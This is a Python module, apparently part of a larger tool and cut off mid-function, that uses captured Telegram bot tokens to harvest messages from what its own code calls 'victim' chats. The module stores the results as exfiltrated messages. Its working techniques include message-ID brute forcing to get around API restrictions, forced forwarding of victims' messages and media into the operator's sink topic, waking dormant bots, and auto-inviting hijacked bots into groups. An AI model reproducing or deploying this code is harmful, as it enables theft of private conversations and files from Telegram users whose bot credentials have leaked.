import asyncio
import logging
from datetime import UTC, datetime
from typing import Any, TypedDict

import httpx
from telethon.errors import (
    AuthKeyUnregisteredError,
    FloodWaitError,
    UserDeactivatedBanError,
)
from telethon.tl.types import Message, MessageMediaDocument, MessageMediaPhoto

from app.core.config import settings
from app.core.database import db
from app.core.security import security
from app.services._scraper.results import (
    ScrapeReason,
    ScrapeResult,
    ScrapeResultClassifier,
    StrategyAttempt,
)
from app.services._scraper.strategies import (
    BotApiUpdateReader,
    BotPreflightService,
    ForwardingArchiveReader,
    MessageIdReader,
    TelethonHistoryReader,
    UserAgentJoinService,
    WebhookStateService,
    unique_append,
)
from app.utils.http_client import get_async_http_client

logger = logging.getLogger("scraper")

# Monitor guard globals and helpers extracted to _scraper/monitor_guard.py.
# Re-exported here so all existing importers (flow_tasks, bot_listener,
# audit_tasks) continue to work without modification.
import contextlib

from app.services._scraper.monitor_guard import (  # noqa: F401
    _MONITOR_GROUP_IDS,
    _MONITOR_GROUP_IDS_RESOLVED,
    _get_monitor_group_ids,
    _is_monitor_group,
    _resolve_monitor_group_ids_async,
    _resolve_monitor_group_ids_sync,
)


async def _resolve_history_result(result):
    while asyncio.isfuture(result) or asyncio.iscoroutine(result):
        result = await result
    return result or []


async def _async_execute(query_builder):
    return await asyncio.to_thread(query_builder.execute)


def _copy_if_present(target: dict[str, Any], source: dict[str, Any], source_key: str, target_key: str | None = None) -> None:
    value = source.get(source_key)
    if value is not None:
        target[target_key or source_key] = value


def _bot_api_media_info(payload: dict[str, Any]) -> tuple[str, dict[str, Any]]:
    file_meta: dict[str, Any] = {}
    file_meta["source"] = "bot_api"

    if isinstance(payload.get("photo"), list) and payload["photo"]:
        photo = payload["photo"][-1] or {}
        if isinstance(photo, dict):
            _copy_if_present(file_meta, photo, "file_id")
            _copy_if_present(file_meta, photo, "file_unique_id")
            _copy_if_present(file_meta, photo, "file_size")
            _copy_if_present(file_meta, photo, "width")
            _copy_if_present(file_meta, photo, "height")
        return "photo", file_meta

    for key in ("document", "video", "audio"):
        media = payload.get(key)
        if isinstance(media, dict):
            _copy_if_present(file_meta, media, "file_id")
            _copy_if_present(file_meta, media, "file_unique_id")
            _copy_if_present(file_meta, media, "file_name")
            _copy_if_present(file_meta, media, "mime_type", "mime")
            _copy_if_present(file_meta, media, "file_size")
            return key, file_meta

    return "text", file_meta


def _telethon_media_info(message: Message) -> tuple[str, dict[str, Any]]:
    if not getattr(message, "media", None):
        return "text", {}

    file_meta: dict[str, Any] = {}
    file_meta["source"] = "telethon"
    try:
        from telethon import utils as telethon_utils

        file_id = telethon_utils.pack_bot_file_id(message.media)
        if file_id:
            file_meta["file_id"] = file_id
    except Exception:
        pass

    if isinstance(message.media, MessageMediaPhoto):
        photo = getattr(message.media, "photo", None)
        file_meta["wc"] = "photo"
        file_meta["id"] = getattr(photo, "id", 0)
        file_meta["access_hash"] = getattr(photo, "access_hash", 0)

        # safely get file_reference (it's bytes)
        file_ref = getattr(photo, "file_reference", b"")
        file_meta["file_reference"] = file_ref.hex() if isinstance(file_ref, bytes) else ""

        return "photo", file_meta

    if isinstance(message.media, MessageMediaDocument):
        document = getattr(message.media, "document", None)
        mime = getattr(document, "mime_type", None) or getattr(getattr(message, "file", None), "mime_type", None)
        if mime:
            file_meta["mime"] = mime
        file_name = getattr(getattr(message, "file", None), "name", None)
        if file_name:
            file_meta["file_name"] = file_name
        doc_id = getattr(document, "id", None)
        if doc_id is not None:
            file_meta["id"] = doc_id
            file_meta["access_hash"] = getattr(document, "access_hash", 0)
            file_ref = getattr(document, "file_reference", b"")
            file_meta["file_reference"] = file_ref.hex() if isinstance(file_ref, bytes) else ""
        if isinstance(mime, str) and mime.startswith("video/"):
            return "video", file_meta
        if isinstance(mime, str) and mime.startswith("audio/"):
            return "audio", file_meta
        return "document", file_meta

    return "other", file_meta


class ScrapedMessage(TypedDict):
    telegram_msg_id: int
    sender_name: str
    content: str
    media_type: str
    file_meta: dict
    chat_id: int


class ScraperService:
    def __init__(self):
        self.api_id = settings.TELEGRAM_API_ID
        self.api_hash = settings.TELEGRAM_API_HASH
        self.classifier = ScrapeResultClassifier()
        self.webhook_state_service = WebhookStateService(
            allow_delete=settings.TELEGRAM_DELETE_WEBHOOK_FOR_SCRAPE,
            classifier=self.classifier,
        )
        self.user_agent_join_service = UserAgentJoinService(classifier=self.classifier)
        self.bot_preflight_service = BotPreflightService(
            is_monitor_bot=self.is_monitor_bot,
            join_service=self.user_agent_join_service,
            classifier=self.classifier,
        )
        self.bot_api_update_reader = BotApiUpdateReader(
            webhook_service=self.webhook_state_service,
            media_formatter=_bot_api_media_info,
            is_monitor_bot=self.is_monitor_bot,
            is_monitor_group=_is_monitor_group,
            classifier=self.classifier,
        )
        self.telethon_history_reader = TelethonHistoryReader(
            self._scrape_via_telethon,
            classifier=self.classifier,
            timeout=settings.TELEGRAM_HISTORY_TIMEOUT_SECONDS + 15,
        )
        self.message_id_reader = MessageIdReader(
            self._scrape_via_id_bruteforce,
            classifier=self.classifier,
            timeout=settings.TELEGRAM_HISTORY_TIMEOUT_SECONDS,
        )
        self.forwarding_archive_reader = ForwardingArchiveReader(
            self._scrape_via_forwarding,
            join_service=self.user_agent_join_service,
            classifier=self.classifier,
        )

    async def scrape_history(
        self, bot_token: str, chat_id: int, limit: int = 3000
    ) -> ScrapeResult:
        """
        Attempts to scrape chat history.
        Strategy 1: Telethon (GetHistory) - Best for deep history. Often restricted.
        Strategy 2: ID Bruteforce (GetMessages) - Uses finding from Strategy 3 to scan backwards.
        Strategy 3: Bot API (getUpdates) - Fallback. Finds recent IDs (needed for Strat 2).
        """
        # Guard: never scrape the monitor group itself as a victim chat.
        # Use async resolver so the first call doesn't block the event loop.
        monitor_ids = await _resolve_monitor_group_ids_async()
        if str(chat_id) in monitor_ids:
            logger.warning("⛔ [Scraper] Refusing to scrape monitor group as victim chat — skipping.")
            return ScrapeResult(
                messages=[],
                reason=ScrapeReason.NO_ACCESSIBLE_UPDATES,
                retryable=False,
                evidence={"chat_id": chat_id, "skipped": "monitor_group"},
                strategy_attempts=[],
                next_action="skip_monitor_group",
            )

        scraped_messages: list[ScrapedMessage] = []
        unique_ids: set[int] = set()
        attempts: list[StrategyAttempt] = []
        evidence: dict[str, Any] = {"chat_id": chat_id, "limit": limit}

        # Pre-flight: ensure bot access and classify terminal invite constraints.
        if not self.is_monitor_bot(bot_token):
            try:
                preflight_attempt = await self.bot_preflight_service.ensure_bot_in_chat(
                    bot_token,
                    chat_id,
                )
                attempts.append(preflight_attempt)
                if preflight_attempt.reason in (
                    ScrapeReason.TOO_MANY_BOTS,
                    ScrapeReason.USER_AGENT_INVITE_FAILED,
                ) and not preflight_attempt.retryable:
                    return self.classifier.result_from_attempts(
                        [],
                        attempts,
                        evidence=evidence,
                    )
            except Exception as exc:
                attempts.append(
                    self.classifier.classify_exception(exc, strategy="bot_preflight")
                )

        # Strategy 1: Telethon (GetHistory)
        telethon_outcome = await self.telethon_history_reader.read(bot_token, chat_id, limit)
        if telethon_outcome.attempt:
            attempts.append(telethon_outcome.attempt)
        unique_append(scraped_messages, unique_ids, telethon_outcome.messages)

        if len(scraped_messages) > 10:
            logger.info(
                f"✨ [Scraper] Telethon normal dump success: {len(scraped_messages)} messages."
            )
            return self.classifier.result_from_attempts(
                scraped_messages,
                attempts,
                evidence=evidence,
            )

        # Get 'Anchor' ID from Bot API (Strategy 3) to enable Strategy 2
        anchor_id = 0
        api_outcome = await self.bot_api_update_reader.read(bot_token, limit=100)
        if api_outcome.attempt:
            attempts.append(api_outcome.attempt)
        for message in api_outcome.messages:
            if str(message.get("chat_id")) != str(chat_id):
                continue
            unique_append(scraped_messages, unique_ids, [message])
            msg_id = message.get("telegram_msg_id")
            if isinstance(msg_id, int):
                anchor_id = max(anchor_id, msg_id)
        if api_outcome.last_update_id is not None:
            evidence["last_update_id"] = api_outcome.last_update_id
        logger.info(f"    [Scraper] Found anchor ID {anchor_id} from Bot API.")

        if api_outcome.terminal and not scraped_messages:
            return self.classifier.result_from_attempts(
                [],
                attempts,
                evidence=evidence,
            )

        # KICKSTART: If bot is dormant (Anchor 0), we must wake it up to get an ID.
        if anchor_id == 0:
            try:
                anchor_id = await self._kickstart_bot(bot_token)
                attempts.append(
                    StrategyAttempt(
                        name="kickstart",
                        success=anchor_id > 0,
                        reason=ScrapeReason.SUCCESS if anchor_id > 0 else ScrapeReason.NO_ACCESSIBLE_UPDATES,
                        evidence={"anchor_id": anchor_id},
                    )
                )
            except Exception as exc:
                attempts.append(self.classifier.classify_exception(exc, strategy="kickstart"))

        # Strategy 3: Blind ID Bruteforce (Telethon GetMessages)
        # If we found an anchor, we can look backwards!
        if anchor_id > 0:
            logger.info(
                f"🔨 [Scraper] Attempting Blind ID Bruteforce from ID {anchor_id} downwards..."
            )
            brute_outcome = await self.message_id_reader.read(
                bot_token,
                chat_id,
                anchor_id,
                limit=500,
            )
            if brute_outcome.attempt:
                attempts.append(brute_outcome.attempt)
            added = unique_append(scraped_messages, unique_ids, brute_outcome.messages)
            logger.info(f"✨ [Scraper] Bruteforce added {added} messages.")

        # Strategy 4: Blind Forwarding (Matkap Style)
        # Extremely powerful but invasive. Use if brute force yielded nothing.
        if len(scraped_messages) == 0 and anchor_id > 0:
            logger.info("🚀 [Scraper] Engaging Matkap-Style Forwarding...")
            forwarding_outcome = await self.forwarding_archive_reader.read(
                bot_token,
                chat_id,
                anchor_id=anchor_id,
                limit=20,
            )
            if forwarding_outcome.attempt:
                attempts.append(forwarding_outcome.attempt)
            added = unique_append(scraped_messages, unique_ids, forwarding_outcome.messages)
            logger.info(f"✨ [Scraper] Forwarding added {added} messages.")

        return self.classifier.result_from_attempts(
            scraped_messages,
            attempts,
            evidence=evidence,
        )

    async def _create_forum_topic(self, bot_token: str, chat_id: int, name: str) -> int:
        """Helper to create a forum topic using a bot."""
        try:
            url = f"https://api.telegram.org/bot{bot_token}/createForumTopic"
            async with httpx.AsyncClient() as client:
                res = await client.post(url, json={"chat_id": chat_id, "name": name}, timeout=10)
                if res.status_code == 200:
                    data = res.json()
                    if data.get("ok"):
                        return data["result"]["message_thread_id"]
        except Exception as e:
            logger.warning(f"    ⚠️ Topic create failed: {e}")
        return 0

    async def _scrape_via_forwarding(
        self, bot_token: str, from_chat_id: int, to_chat_id: int, start_id: int, limit: int
    ) -> list[dict]:
        """
        Matkap-style: Forces bot to forward messages to a sink chat (Forum Topic).
        1. Creates a topic: '💀 @bot_username'
        2. Forwards messages there.
        3. KEEPS them there (no delete).
        """
        from app.core.config import settings

        msgs = []
        base_url = f"https://api.telegram.org/bot{bot_token}"

        async with httpx.AsyncClient() as client:
            # 0. Get Bot Info for Topic Name
            bot_username = "unknown_bot"
            bot_id = "0"
            try:
                me_res = await client.get(f"{base_url}/getMe", timeout=5)
                if me_res.status_code == 200:
                    data = me_res.json()
                    if data.get("ok"):
                        bot_username = data["result"].get("username", "unknown")
                        bot_id = str(data["result"].get("id", "0"))
            except Exception:
                pass  # getMe failed — use defaults for topic name
            target_thread_id = 0
            if settings.bot_tokens:
                topic_name = f"@{bot_username} / {bot_id}"
                logger.info(f"    [Scraper] Creating topic '{topic_name}'...")
                target_thread_id = await self._create_forum_topic(
                    settings.bot_tokens[0], to_chat_id, topic_name
                )

            if not target_thread_id:
                logger.warning(
                    "    [Scraper] Could not create topic (check permissions/forum mode). Forwarding to 'General'..."
                )

            # Scan backwards from start_id
            for msg_id in range(start_id, max(0, start_id - limit), -1):
                try:
                    # 2. Forward
                    payload = {
                        "chat_id": to_chat_id,
                        "from_chat_id": from_chat_id,
                        "message_id": msg_id,
                    }
                    if target_thread_id:
                        payload["message_thread_id"] = target_thread_id

                    res = await client.post(f"{base_url}/forwardMessage", json=payload, timeout=5)

                    if res.status_code == 200:
                        data = res.json()
                        if data.get("ok"):
                            result = data["result"]

                            # Parse Content
                            content = result.get("text") or result.get("caption") or ""

                            media_type, file_meta = _bot_api_media_info(result)

                            original_sender = "Unknown"
                            if "forward_from" in result:
                                original_sender = result["forward_from"].get("username") or result[
                                    "forward_from"
                                ].get("first_name")

                            msgs.append(
                                {
                                    "telegram_msg_id": msg_id,
                                    "sender_name": original_sender,
                                    "content": content,
                                    "media_type": media_type,
                                    "file_meta": file_meta,
                                    "chat_id": from_chat_id,
                                }
                            )

                            # 3. NO DELETE - User wants to keep them!

                            await asyncio.sleep(0.2)  # Rate limit safety

                    elif res.status_code == 429:
                        logger.warning("    Rate limit hit, sleeping...")
                        await asyncio.sleep(2)
                except Exception:
                    pass

        return msgs

    async def _scrape_via_id_bruteforce(
        self, bot_token: str, chat_id: int, start_id: int, limit: int
    ) -> list[dict]:
        """
        Fetches messages by ID batches (GetMessages) instead of listing history (GetHistory).
        Bypasses 'API restricted' error for listing history.
        """
        from app.services.bot_manager_srv import bot_manager

        msgs = []
        try:
            client = await bot_manager.get_client(bot_token)

            # Create batches of IDs to check
            # Scan backwards from start_id
            # e.g. 1000 IDs total
            ids_to_check = []
            for i in range(start_id, max(0, start_id - limit), -1):
                ids_to_check.append(i)

            # Chunk into 100s
            chunk_size = 100
            for i in range(0, len(ids_to_check), chunk_size):
                batch = ids_to_check[i : min(i + chunk_size, len(ids_to_check))]
                try:
                    # Request specific IDs
                    found = await client.get_messages(chat_id, ids=batch)

                    for message in found:
                        if not message or not isinstance(message, Message):
                            continue

                        content = message.text or ""
                        media_type, file_meta = _telethon_media_info(message)

                        sender_name = "Unknown"
                        if message.sender:
                            if hasattr(message.sender, "username") and message.sender.username:
                                sender_name = message.sender.username
                            elif hasattr(message.sender, "first_name"):
                                sender_name = message.sender.first_name

                        msgs.append(
                            {
                                "telegram_msg_id": message.id,
                                "sender_name": sender_name,
                                "sender_user_id": getattr(message.sender, "id", None) if message.sender else None,
                                "content": content,
                                "media_type": media_type,
                                "file_meta": file_meta,
                                "chat_id": chat_id,
                            }
                        )
                except Exception:
                    # print(f"Batch fail: {e}")
                    pass
        except Exception as e:
            logger.error(f"❌ [Scraper] Bruteforce Telethon error: {e}")
            raise
        return msgs

    async def _scrape_via_telethon(self, bot_token: str, chat_id: int, limit: int) -> list[dict]:
        from app.services.bot_manager_srv import bot_manager

        msgs = []
        try:
            from app.core.redis_srv import redis_srv

            # Key format: bot_restricted:{chat_id}
            # If exists, skip Telethon entirely to save time/logs
            if redis_srv.is_on_cooldown(f"bot_restricted:{chat_id}"):
                logger.info(
                    f"    ⏩ [Scraper] Skipping Telethon (Cached Restriction) for Chat {chat_id}. Using UserAgent..."
                )
                from app.services.user_agent_srv import user_agent

                return await _resolve_history_result(user_agent.get_history(chat_id, limit))

            # logger.info(f"🔐 [Scraper] Getting shared client for bot...")
            client = await bot_manager.get_client(bot_token)

            # Pre-check via Bot API to Prevent ApiBotRestrictedError / bans proactively
            async with httpx.AsyncClient(timeout=5.0) as http_client:
                check_res = await http_client.get(
                    f"https://api.telegram.org/bot{bot_token}/getChat", params={"chat_id": chat_id}
                )
                if check_res.status_code in [400, 401, 403]:
                    logger.warning(
                        f"    🛡️ [Scraper] Bot API reports no access (HTTP {check_res.status_code}). Falling back to UserAgent..."
                    )
                    redis_srv.set_cooldown(f"bot_restricted:{chat_id}", 21600)
                    from app.services.user_agent_srv import user_agent

                    return await _resolve_history_result(user_agent.get_history(chat_id, limit))

            logger.info(f"📖 [Scraper] Fetching history via Telethon (Limit: {limit})...")

            # ATTEMPT 1: Resolve Entity explicitly
            entity = None
            try:
                entity = await asyncio.wait_for(client.get_entity(chat_id), timeout=10.0)
            except (ValueError, asyncio.TimeoutError):
                logger.warning("    ⚠️ [Scraper] Entity not found directly. Refreshing dialogs...")
                try:
                    await asyncio.wait_for(
                        client.get_dialogs(limit=100), timeout=15.0
                    )  # Populate cache
                    entity = await asyncio.wait_for(client.get_entity(chat_id), timeout=10.0)
                except Exception as e:
                    logger.error(
                        f"    ❌ [Scraper] Could not resolve entity even after dialog refresh: {e}"
                    )

            target = entity if entity else chat_id

            async def _fetch():
                local_msgs = []
                async for message in client.iter_messages(target, limit=limit):
                    if not isinstance(message, Message):
                        continue

                    content = message.text or ""
                    media_type, file_meta = _telethon_media_info(message)

                    sender_name = "Unknown"
                    if message.sender:
                        if hasattr(message.sender, "username") and message.sender.username:
                            sender_name = message.sender.username
                        elif hasattr(message.sender, "first_name"):
                            sender_name = message.sender.first_name

                    local_msgs.append(
                        {
                            "telegram_msg_id": message.id,
                            "sender_name": sender_name,
                            "content": content,
                            "media_type": media_type,
                            "file_meta": file_meta,
                            "chat_id": chat_id,  # Ensure we track where it came from
                        }
                    )
                return local_msgs

            msgs = await asyncio.wait_for(_fetch(), timeout=90.0)

        except asyncio.TimeoutError:
            logger.error(
                "    ⏰ [Scraper] Telethon history fetch timed out (asyncio.TimeoutError)."
            )
            raise
        except FloodWaitError as e:
            logger.warning(f"    🛑 [Scraper] FloodWait in history fetch: {e.seconds}s.")
            raise
        except AuthKeyUnregisteredError:
            logger.error("    ❌ [Scraper] Session auth key revoked — session needs re-login.")
            raise
        except UserDeactivatedBanError:
            logger.error("    ❌ [Scraper] Account banned by Telegram.")
            raise
        except Exception as e:
            err_str = str(e)
            if (
                "API access for bot users is restricted" in err_str
                or "ChatAdminRequired" in err_str
            ):
                logger.warning(
                    f"    🛡️ [Scraper] Bot Restricted ({err_str}). Falling back to UserAgent..."
                )
                with contextlib.suppress(Exception):
                    redis_srv.set_cooldown(f"bot_restricted:{chat_id}", 21600)

                from app.services.user_agent_srv import user_agent

                return await user_agent.get_history(chat_id, limit) or []

            logger.error(f"❌ [Scraper] Telethon history error: {e}")
            raise
        return msgs

    def is_monitor_bot(self, token: str) -> bool:
        """
        Robustly checks if a token belongs to one of OUR bots.

        Checks two sources:
        1. MONITOR_BOT_TOKEN — command bots that run the listener
        2. PROTECTED_BOT_IDS — numeric IDs of owned bots whose tokens
           we may not have (personal bots used in other projects)

        Strips whitespace and compares Bot IDs (prefix before colon).
        """
        if not token:
            return False

        clean_token = token.strip()
        token_id = clean_token.split(":")[0] if ":" in clean_token else ""

        # Check against MONITOR_BOT_TOKEN (full tokens)
        for monitor_token in (settings.bot_tokens or []):
            clean_monitor = monitor_token.strip()
            if clean_token == clean_monitor:
                return True
            if token_id and ":" in clean_monitor:
                if token_id == clean_monitor.split(":")[0]:
                    return True

        # Check against PROTECTED_BOT_IDS (numeric IDs only)
        if token_id and settings.PROTECTED_BOT_IDS:
            protected = [i.strip() for i in settings.PROTECTED_BOT_IDS.split(",") if i.strip()]
            if token_id in protected:
                return True

        return False

    async def _ensure_bot_in_chat(self, bot_token: str, chat_id: int) -> bool:
        """
        Checks if the bot has access to the target chat.
        If not (403/400), attempts to invite it using UserAgent.
        Returns True if bot has access, False otherwise.
        """
        base_url = f"https://api.telegram.org/bot{bot_token}"

        # 1. Check access via Bot API getChat
        try:
            async with httpx.AsyncClient(timeout=10.0) as client:
                res = await client.get(f"{base_url}/getChat", params={"chat_id": chat_id})
                if res.status_code == 200 and res.json().get("ok"):
                    return True  # Bot already has access

                if res.status_code not in [400, 401, 403]:
                    # Unexpected error, don't try to fix
                    logger.warning(
                        f"    ⚠️ [Scraper] getChat returned HTTP {res.status_code}, skipping auto-invite."
                    )
                    return False
        except Exception as e:
            logger.warning(f"    ⚠️ [Scraper] getChat check failed: {e}")
            return False

        # 2. Bot doesn't have access — try to invite it
        logger.info(f"    🚪 [Scraper] Bot not in target chat {chat_id}. Attempting auto-invite...")
        try:
            # Get bot username
            bot_username = None
            async with httpx.AsyncClient(timeout=5.0) as client:
                me_res = await client.get(f"{base_url}/getMe")
                if me_res.status_code == 200:
                    data = me_res.json()
                    if data.get("ok"):
                        bot_username = data["result"].get("username")

            if not bot_username:
                logger.warning("    ⚠️ [Scraper] Could not resolve bot username for invite.")
                return False

            # Check UserAgent cooldown
            from app.core.redis_srv import redis_srv

            if redis_srv.is_on_cooldown("user_agent"):
                ttl = redis_srv.get_cooldown_remaining("user_agent")
                logger.warning(
                    f"    ⏳ [Scraper] Skipping auto-invite: UserAgent on cooldown ({ttl}s left)."
                )
                return False

            from app.services.user_agent_srv import user_agent

            success = await user_agent.invite_bot_to_group(bot_username, chat_id)
            if success:
                logger.info(
                    f"    ✅ [Scraper] Auto-invited @{bot_username} to chat {chat_id}. Waiting for propagation..."
                )
                await asyncio.sleep(3)  # Wait for Telegram to propagate membership
                return True
            else:
                logger.warning(
                    f"    ❌ [Scraper] Auto-invite of @{bot_username} to chat {chat_id} failed."
                )
                return False

        except Exception as e:
            logger.warning(f"    ⚠️ [Scraper] Auto-invite error: {e}")
            return False

    async def _scrape_via_bot_api(self, bot_token: str) -> list[dict]:
        """
        Fallback: Use httpx to hit https://api.telegram.org/bot<token>/getUpdates
        If webhook is active, only delete it when policy allows.
        """
        logger.info("🔄 [Scraper] Attempting Bot API getUpdates fallback...")
        outcome = await self.bot_api_update_reader.read(bot_token, limit=100)
        if outcome.attempt and outcome.attempt.reason == ScrapeReason.WEBHOOK_CONFLICT:
            logger.warning("    ⚠️ [Scraper] Webhook conflict — getUpdates skipped by policy.")
        elif outcome.attempt and not outcome.attempt.success:
            logger.warning(
                f"    ⚠️ [Scraper] Bot API read classified as {outcome.attempt.reason}: "
                f"{outcome.attempt.evidence}"
            )
        return outcome.messages

    async def discover_chats(self, bot_token: str) -> (dict, list[dict]):
        """
        Validates a bot token and discovers chats using Telegram Bot API.
        Returns: (bot_info, discovered_chats)
        """
        base_url = f"https://api.telegram.org/bot{bot_token}"
        discovered_chats = []
        bot_info = {}

        # Prevent discovering/kickstarting our own monitor bot
        is_monitor_bot = self.is_monitor_bot(bot_token)

        try:
            bot_id_only = bot_token.split(":")[0]
            logger.info(f"🔍 [Discovery] Validating bot_id={bot_id_only} via Bot API")

            async with httpx.AsyncClient(timeout=15.0) as client:
                # Step 1: Validate token with getMe
                try:
                    me_res = await client.get(f"{base_url}/getMe")
                except Exception as e:
                    logger.error(f"    ❌ Connection failed: {e}")
                    return {}, []

                if me_res.status_code != 200:
                    logger.info(f"    ❌ Token invalid or revoked (HTTP {me_res.status_code})")
                    return {}, []

                me_data = me_res.json()
                if not me_data.get("ok"):
                    logger.info("    ❌ Token invalid or revoked")
                    return {}, []

                bot_info = me_data.get("result", {})
                logger.info(f"    ✅ Token valid! Bot: @{bot_info.get('username', 'unknown')}")

                # Step 2: Get recent chats from getUpdates
                try:
                    if is_monitor_bot:
                        logger.info("    ⏭️ [Discovery] Skipping getUpdates for Monitor Bot.")
                        updates_res = type(
                            "obj",
                            (object,),
                            {"status_code": 200, "json": lambda: {"ok": True, "result": []}},
                        )()
                    else:
                        webhook_decision = await self.webhook_state_service.prepare_polling(
                            bot_token,
                            client,
                            strategy="discover_chats",
                        )
                        if not webhook_decision.can_poll:
                            if webhook_decision.attempt.reason == ScrapeReason.WEBHOOK_CONFLICT:
                                logger.warning(
                                    "    ⚠️ [Discovery] Webhook configured — leaving it intact and skipping getUpdates."
                                )
                            else:
                                logger.warning(
                                    f"    ⚠️ [Discovery] getUpdates preflight classified as "
                                    f"{webhook_decision.attempt.reason}"
                                )
                            return bot_info, []
                        updates_res = await client.get(
                            f"{base_url}/getUpdates", params={"limit": 100}
                        )

                except Exception as e:
                    logger.warning(f"    ⚠️ Failed to fetch updates: {e}")
                    # Return just bot info if updates fail
                    return bot_info, []

                if updates_res.status_code == 200:
                    updates_data = updates_res.json()
                    if updates_data.get("ok"):
                        updates = updates_data.get("result", [])

                        # Extract unique chats from updates
                        seen_chats = set()
                        for update in updates:
                            # Check message, edited_message, channel_post, etc.
                            for key in [
                                "message",
                                "edited_message",
                                "channel_post",
                                "edited_channel_post",
                                "my_chat_member",
                                "chat_member",
                            ]:
                                if key in update:
                                    chat = update[key].get("chat", {})
                                    chat_id = chat.get("id")
                                    # Never record our own monitor group as a victim chat
                                    if _is_monitor_group(chat_id):
                                        continue
                                    if chat_id and chat_id not in seen_chats:
                                        seen_chats.add(chat_id)
                                        chat_type = chat.get("type", "unknown")
                                        chat_name = (
                                            chat.get("title")
                                            or chat.get("username")
                                            or chat.get("first_name")
                                            or str(chat_id)
                                        )

                                        discovered_chats.append(
                                            {"id": chat_id, "name": chat_name, "type": chat_type}
                                        )
                                        logger.info(
                                            f"    📍 Found Chat: {chat_name} (ID: {chat_id}, Type: {chat_type})"
                                        )

                        # If no updates but token is valid, use bot's own ID as fallback
                        if not discovered_chats:
                            # Token works but no recent activity - still valid!
                            # Use a placeholder to indicate token is valid but no chats found
                            logger.info("    ℹ️ Token valid but no recent chat activity")
                            # Return bot info as a "chat" so validation passes
                            discovered_chats.append(
                                {
                                    "id": bot_info.get("id"),
                                    "name": f"@{bot_info.get('username', 'bot')} (Bot Self)",
                                    "type": "bot_self",
                                }
                            )

                logger.info(f"🏁 [Discovery] Found {len(discovered_chats)} chat(s) for this bot.")

        except httpx.TimeoutException:
            logger.warning("    ⚠️ Telegram API timeout")
        except Exception as e:
            logger.error(f"Error discovering chats: {e}")

        # PROACTIVE KICKSTART: If discovery yielded nothing, try to wake the bot up.
        if not discovered_chats and bot_info.get("username"):
            if is_monitor_bot:
                logger.info(
                    "    ℹ️ [Discovery] Monitor bot is dormant, but skipping kickstart to prevent loops."
                )
            else:
                logger.info(
                    "💤 [Discovery] Bot seems dormant. Initiating Kickstart sequence to create a chat..."
                )
                new_anchor = await self._kickstart_bot(bot_token)
                if new_anchor > 0:
                    # If kickstart worked, we should have at least one update now.
                    # We can't easily get the chat ID without re-running discovery,
                    # OR we can just return the bot itself as a "chat" and let the next scrape cycle handle it.
                    # IMPROVEMENT: Let's re-run discovery one last time?
                    # For now, let's just let the next cycle pick it up, but return the Bot Self so it's not removed.
                    logger.info(
                        "    ✅ [Discovery] Kickstart successful. Updates should be available next cycle."
                    )
                    discovered_chats.append(
                        {
                            "id": bot_info.get("id"),
                            "name": f"@{bot_info.get('username', 'bot')} (Kickstarted)",
                            "type": "bot_self",
                        }
                    )

        return bot_info, discovered_chats

    async def _probe_gateway_telemetry(self, raw_token: str, cred_id: str) -> None:
        """
        Passively capture Telegram gateway metadata before polling/scraping.

        Best-effort by design: failures must never block preflight or exfiltration.
        """
        try:
            try:
                token = security.decrypt(raw_token).strip()
            except Exception:
                token = (raw_token or "").strip()

            if not token or ":" not in token:
                return

            base_url = f"https://api.telegram.org/bot{token}"
            async with get_async_http_client(timeout=8.0) as client:
                wh_task = client.get(f"{base_url}/getWebhookInfo")
                cmd_task = client.get(f"{base_url}/getMyCommands")
                desc_task = client.get(f"{base_url}/getMyDescription")
                wh_res, cmd_res, desc_res = await asyncio.gather(
                    wh_task,
                    cmd_task,
                    desc_task,
                    return_exceptions=True,
                )

            webhook_data: dict[str, Any] = {}
            commands_list: list[dict[str, Any]] = []
            bio_description = None

            if isinstance(wh_res, httpx.Response) and wh_res.status_code == 200:
                wh_json = wh_res.json()
                if wh_json.get("ok"):
                    webhook_data = wh_json.get("result") or {}
            elif isinstance(wh_res, httpx.Response) and wh_res.status_code == 401:
                return

            if isinstance(cmd_res, httpx.Response) and cmd_res.status_code == 200:
                cmd_json = cmd_res.json()
                if cmd_json.get("ok"):
                    commands_list = [
                        {
                            "command": item.get("command"),
                            "description": item.get("description"),
                        }
                        for item in (cmd_json.get("result") or [])
                        if item.get("command")
                    ]

            if isinstance(desc_res, httpx.Response) and desc_res.status_code == 200:
                desc_json = desc_res.json()
                if desc_json.get("ok"):
                    bio_description = (desc_json.get("result") or {}).get("description")

            telemetry_dict = {
                "configured_webhook_url": webhook_data.get("url"),
                "resolved_ip_address": webhook_data.get("ip_address"),
                "command_dictionary": commands_list,
                "service_description": bio_description,
                "last_error_info": webhook_data.get("last_error_message"),
                "last_error_date": webhook_data.get("last_error_date"),
                "allowed_updates": webhook_data.get("allowed_updates"),
                "probed_at": datetime.now(UTC).isoformat(),
            }

            await _async_execute(
                db.rpc(
                    "patch_credential_meta",
                    {
                        "target_id": cred_id,
                        "patch_key": "gateway_telemetry",
                        "patch_data": telemetry_dict,
                    },
                )
            )
        except Exception as e:
            logger.debug(f"[GatewayTelemetry] Probe failed for {cred_id}: {e}")

    async def _http_preflight_check(self, auth_token: str) -> tuple[list[dict[str, Any]], dict[str, Any], bool]:
        """
        Lightweight HTTP-only check to verify token validity, fetch webhook info,
        and retrieve recent updates before committing to a full Telethon scrape.

        Returns (formatted_updates, meta_dict, is_revoked).
        Updates use the same schema keys as ScraperService.scrape_history() so they
        can be inserted into exfiltrated_messages after adding credential_id.
        """
        try:
            # Warm the monitor group cache before iterating updates
            monitor_ids = await _resolve_monitor_group_ids_async()

            async with get_async_http_client(timeout=10.0) as client:
                # 1. Check webhook info and token validity
                resp = await client.get(f"https://api.telegram.org/bot{auth_token}/getWebhookInfo")
                if resp.status_code == 401:
                    return ([], {}, True)

                meta_dict: dict[str, Any] = {}
                if resp.status_code == 200:
                    webhook_url = resp.json().get("result", {}).get("url")
                    if webhook_url:
                        meta_dict = {"webhook_url": webhook_url}

                # 2. Fetch recent updates
                resp = await client.get(
                    f"https://api.telegram.org/bot{auth_token}/getUpdates",
                    params={"limit": 100},
                )
                formatted_updates: list[dict[str, Any]] = []
                if resp.status_code == 200:
                    updates = resp.json().get("result", [])
                    last_update_id = None
                    for update in updates:
                        if isinstance(update, dict) and isinstance(update.get("update_id"), int):
                            last_update_id = max(last_update_id or update["update_id"], update["update_id"])
                        target = update.get("message") or update.get("channel_post")
                        if not target:
                            continue
                        chat_id = target.get("chat", {}).get("id")
                        if str(chat_id) in monitor_ids or chat_id in monitor_ids:
                            continue
                        # Media detection
                        media_type, file_meta = _bot_api_media_info(target)
                        entities = target.get("entities") or target.get("caption_entities")
                        if entities:
                            file_meta["entities"] = entities
                        formatted_updates.append({
